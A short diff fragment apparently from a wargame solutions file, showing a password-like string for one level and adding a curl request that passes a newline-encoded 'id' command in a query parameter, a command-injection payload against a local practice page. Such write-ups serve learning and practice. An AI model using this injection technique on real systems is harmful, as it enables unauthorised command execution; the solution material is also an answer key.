@@ -58,5 +58,5 @@
 * WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
 
 #### Level 17
-
+* curl -X GET "http://127.0.0.1/level16/?needle=%0Aid%0A"
 
